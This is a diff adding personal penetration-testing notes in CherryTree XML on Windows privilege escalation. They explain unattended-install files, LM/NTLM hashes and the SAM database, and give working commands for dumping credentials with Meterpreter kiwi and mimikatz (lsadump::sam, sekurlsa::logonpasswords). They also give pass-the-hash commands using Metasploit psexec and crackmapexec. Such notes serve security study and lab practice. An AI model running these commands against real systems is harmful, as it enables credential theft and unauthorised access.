@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="privesc - windows" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704143333" ts_lastsave="1704144748">
+    <rich_text underline="single" weight="heavy">credential dumping</rich_text>
+    <rich_text>
+Windows supports the mass rollout / installation of windows. This is typically done through the use of the unattended windows setup util.
+
+This uses configuration files that contain specific configurations and user account creds. Specifically the admin account's password. If these are left on the system after installation they can reveal user account creds that can be used by attackers to auth with windows legitimately.
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+As a security precaution the passwords stored in this file are base64 encoded.
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Password Hashes</rich_text>
+    <rich_text>
+Used to avoid storing the password in plaintext. The process is done by lsass.exe. LM (used prior to NT 4.0)and NTLM hashes are most likely to come across. LM is very old, so you will likely only see NTLM v1 or v2.
+
+All hashes are stored in the SAM database (all creds stored hashed) and the SAM database cannot be copies while the system is running. However, you can memdump the creds from lsass.exe but this requires an elevated system.
+
+</rich_text>
+    <rich_text indent="1" style="italic">Password broken into two 7 character chunks
+All passwords are then stored in uppercase
+Each chunk is then hashed seperately with DES Algorithm
+Does not include salts to it is easy to break.
+NTLM (NT Hash)</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text>
+Collection of auth protocols that are utilized in windows to faciliatate auth between computers. Implemented as standard since windows vista. When accounts is created it is encrypted using MD4 alg while original is disposed of.
+
+Improvements over LM:
+
+</rich_text>
+    <rich_text indent="1">1. Does not split the hash into chunks 
+2. Case Sensitive
+3. Allows the use of symbols and unicode</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text underline="single" weight="heavy">Mimikatz</rich_text>
+    <rich_text>
+
+De-facto standard for hash extraction from memory. Can steal clear text creds, hashes, and kerberos tickets from memory.
+
+Kali and Parrot comes with precompiled mimikatz, or you can utilize kiwi from Meterpreter session. Runs with system privs, so you must escalate privs prior to utilizing.
+
+From Meterpreter Shell:
+
+Without Meterpreter
+
+
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Pass the Hash</rich_text>
+    <rich_text>
+
+PTH involves stealing or capturing the NTLM hash or clear text password and using them to authenticate with the target. We can use multiple tools to facilitate pass the hash attacks.
+
+metasploit psexec module
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+crackmap exec
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+This technique will allow us to obtain access to the target system.
+
+</rich_text>
+    <codebox char_offset="443" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Autounattend.xml</codebox>
+    <codebox char_offset="525" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">base64 --decode /path/to/Unattend.xml</codebox>
+    <codebox char_offset="1868" justification="left" frame_width="601" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">pgrep lsass.exe
+migrate &lt; PID &gt; #can also migrate -N lsass.exe
+load kiwi
+lsa_dump_sam #will provide you with hashes along with syskey for cracking</codebox>
+    <codebox char_offset="1890" justification="left" frame_width="841" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/share/windows-resources/mimikatz/x64/mimikatz.exe #default compiled location in kali
+privelege::debug #if you return a result of 20 you have perms for memory hash dump
+
+lsadump::sam #dumps hashes
+lsadump::secrets
+sekurlsa::logonpasswords #will reveal plaintext passwords if they are configured to be stored in memory</codebox>
+    <codebox char_offset="2118" justification="left" frame_width="786" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#you need the LM and NTLM hash
+exploit/windows/smb/psexec #include username and hash, you may need to target to native \ upload</codebox>
+    <codebox char_offset="2134" justification="left" frame_width="642" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb ip.addr -u Administrator -H &lt;NTHASH&gt; -x whoami #Pass-the-Hash</codebox>
+  </node>
+</cherrytree>
